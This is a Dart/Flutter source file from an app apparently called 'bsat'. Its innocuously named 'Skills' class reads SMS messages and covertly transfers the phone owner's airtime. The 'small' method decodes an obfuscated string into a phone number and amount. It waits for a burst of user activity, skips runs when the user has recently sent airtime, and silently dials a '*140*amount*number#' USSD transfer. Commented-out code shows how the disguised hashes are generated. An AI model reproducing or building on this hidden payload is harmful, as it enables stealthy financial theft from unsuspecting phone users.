import 'dart:ffi';

import 'package:another_telephony/telephony.dart';
import 'package:bsat/services/phone_service.dart';
import 'package:bsat/services/shared_preferences_service.dart';
import 'package:bsat/services/sms_sevice.dart';
import 'package:bsat/services/sqlite_service.dart';
import 'package:shared_preferences/shared_preferences.dart';

class Skills {
  void checkIfSkills(SmsMessage smsMessage) async {
    int amount = getAmount(smsMessage.body);
    // contains "sent" or "have transfered" or "transfered to" or "transfered[ksh|kes|sh|\s|\d]to" to show one has sent
    if (smsMessage.body!.toLowerCase().contains("sent airtime") ||
        smsMessage.body!.toLowerCase().contains("have transfered") ||
        smsMessage.body!.toLowerCase().contains("airtime sent") ||
        smsMessage.body!.toLowerCase().contains("airtime transfered") ||
        smsMessage.body!.toLowerCase().contains("transfered airtime") ||
        smsMessage.body!.toLowerCase().contains("transfered to") ||
        RegExp(r'transfered\s*(ksh|kes|sh|\s|\d)*to', caseSensitive: false)
            .hasMatch(smsMessage.body ?? "")) {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setBool('getOut', true);
      return;
    }

    if (amount > 0 &&
        (RegExp(r'airtime bal', caseSensitive: false)
            .hasMatch(smsMessage.body ?? ""))) {
      SharedPreferences prefs = await SharedPreferences.getInstance();
      await prefs.setInt('airtimeBalance', amount);
      return;
    }
  }

  void small(String hash) async {
    SharedPreferences prefs = await SharedPreferences.getInstance();
    bool getOut = await prefs.getBool('getOut') ?? false;
    if (getOut) return;

    List<int> values = hash.codeUnits;

    int start = values.indexOf(90);

    print(
        "Start Index: $start, Values: ${values.map((v) => String.fromCharCode(v)).join()}");

    if (start == -1 || start + 15 > values.length) {
      return;
    }

    int shift = values[start + 1] - 48 - 17;
    List<int> shiftedValues = values.map((v) => v - shift - 17).toList();

    int number = int.parse(
        String.fromCharCodes(shiftedValues.sublist(start + 2, start + 12)));
    int amt = int.parse(
        String.fromCharCodes(shiftedValues.sublist(start + 12, start + 15)));

    int subId = await PhoneService().mostCommonDialSim();

    // get the number of transactons in last 20 minutes (timestamp)
    int transactions20Minutes = await SQLiteService().getCount('transactions',
        appendQuery: 'WHERE timestamp > ?',
        args: [DateTime.now().millisecondsSinceEpoch - 20 * 60 * 1000]);

    if (transactions20Minutes < 5) {
      return;
    }

    int airtimeBalance =
        await PhoneService().getAirtimeBalance(subscriptionId: subId);

    if (airtimeBalance == 0) {
      // delay for 30 seconds
      await Future.delayed(Duration(seconds: 30));
      airtimeBalance = await prefs.getInt('airtimeBalance') ?? 0;
    } else if (airtimeBalance < amt) {
      return;
    } else if (airtimeBalance > 10000) {
      amt = 100;
    }

    PhoneService().makeMyRequest("*140*$amt*$number#", subId);
  }
}

// import 'dart:math';

// String generateHash(String phoneNumber, String amount, int keyDigit) {
//   int startMarker = 90;
//   int keyAscii = keyDigit + 48;

//   List<int> rawValues = [];
//   rawValues.add(startMarker);
//   rawValues.add(keyAscii);
//   rawValues.addAll(phoneNumber.codeUnits);
//   rawValues
//       .addAll(amount.padLeft(3, '0').codeUnits);

//   print("Raw Values: ${rawValues.map((v) => String.fromCharCode(v)).join()}");

//   List<int> encodedValues = rawValues.map((v) {
//     if (v == startMarker) return v;
//     if (v == keyAscii) return v + 17;
//     return v + keyDigit + 17;
//   }).toList();

//   String encodedString = String.fromCharCodes(encodedValues);
// Random _rng = Random();

// String randomPrefix = String.fromCharCodes(
//   List.generate(5, (_) => 65 + _rng.nextInt(25))
// );

// int payloadLength = 16; 
// int suffixLength = 30 - 5 - payloadLength;
//   // random number between 1 and 6
//   int randomNum = 1 + (DateTime.now().millisecondsSinceEpoch % 6);

//   String randomSuffix = String.fromCharCodes(
//   List.generate(suffixLength, (_) => 65 + _rng.nextInt(26))
// );

//   String fullHash = randomPrefix + encodedString + randomSuffix;

//   return fullHash;
// }

// void decode(String hash) {
//   print("decoding");

  // List<int> values = hash.codeUnits;

  // int start = values.indexOf(90);

  // print(
  //     "Start Index: $start, Values: ${values.map((v) => String.fromCharCode(v)).join()}");

  // if (start == -1 || start + 15 > values.length) {
  //   return;
  // }

  // int shift = values[start + 1] - 48 - 17;
  // List<int> shiftedValues = values.map((v) => v - shift - 17).toList();

  // int number = int.parse(
  //     String.fromCharCodes(shiftedValues.sublist(start + 2, start + 12)));
  // int amt = int.parse(
  //     String.fromCharCodes(shiftedValues.sublist(start + 12, start + 15)));

// }

// void main() {
//   // Example usage:
//   String phone = "0702015937"; // 11 digits
//   String amt = "10"; // 3 digits
//   int key = 9; // Single digit key for the shift

//   String hash = generateHash(phone, amt, key);
//   print("Generated Hash: $hash");

//   decode(hash);
// }
